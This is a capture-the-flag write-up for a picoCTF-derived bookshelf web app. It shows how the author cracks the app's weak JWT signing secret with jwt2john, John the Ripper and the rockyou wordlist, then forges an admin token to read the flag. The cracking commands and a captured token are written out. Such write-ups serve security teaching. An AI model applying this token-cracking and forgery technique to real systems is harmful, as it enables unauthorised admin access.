Description: `I came across a web app for bookshelves on picoctf2023 that had a security bug, which I managed to fix. However, despite my efforts, my site is still vulnerable and has been hacked. Can you assist me in identifying the vulnerability?`


### 1. Analysis the problem
- This web application is derived from picoctf2023 and it had a security problem. The author try to fix it but it still vulnerable. Let's check what is the vulnerability on the original version.

- "In this source code, it appears that it first attempts to read the key from a local file `server_secret.txt`, but if the file doesn’t exist, then it instead uses a hardcoded “random” string of `1234` instead." `https://brandon-t-elliott.github.io/java-code-analysis`

- Combined with the information about the problem, we can guess that the author tried to fix this vulnerability by changing the secret key and not sharing the source code, but maybe this secret code is not really good. They can be easily broken.

### 2. Inference verification
- Let's try to crack the secret key from the JWT Token with john-the-ripper.

- Go to the web app and get the JWT Token:`eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiRnJlZSIsImlzcyI6ImJvb2tzaGVsZiIsImV4cCI6MTY4NDY3MTUwNSwiaWF0IjoxNjg0MDY2NzA1LCJ1c2VySWQiOjEsImVtYWlsIjoidXNlciJ9.IUz5WwBeBeqbUJKQUffoKpKFUcCQZilQML4jv-gpSZA`

 - Convert JWT Token to John hash
 ![jwt2john](jwt2john.png)

```
jwt2john
jwt2john eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiRnJlZSIsImlzcyI6ImJvb2tzaGVsZiIsImV4cCI6MTY4NDY3MTUwNSwiaWF0IjoxNjg0MDY2NzA1LCJ1c2VySWQiOjEsImVtYWlsIjoidXNlciJ9.IUz5WwBeBeqbUJKQUffoKpKFUcCQZilQML4jv-gpSZA
jwt2john eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiRnJlZSIsImlzcyI6ImJvb2tzaGVsZiIsImV4cCI6MTY4NDY3MTUwNSwiaWF0IjoxNjg0MDY2NzA1LCJ1c2VySWQiOjEsImVtYWlsIjoidXNlciJ9.IUz5WwBeBeqbUJKQUffoKpKFUcCQZilQML4jv-gpSZA > jwt.hash
```

 - Start to crack it use *rockyou* wordlist.
![crack](crack.png)
```
john --wordlist=/usr/share/wordlists/rockyou.txt jwt.hash
```
- And we got the secret key, now you can modify the JWT Token to get the Admin permission to read the flag book.

![flag.png](flag.png)
```
Flag: FIA{|3rute_F0rce_JWT_1s_S0_E@sy}
```
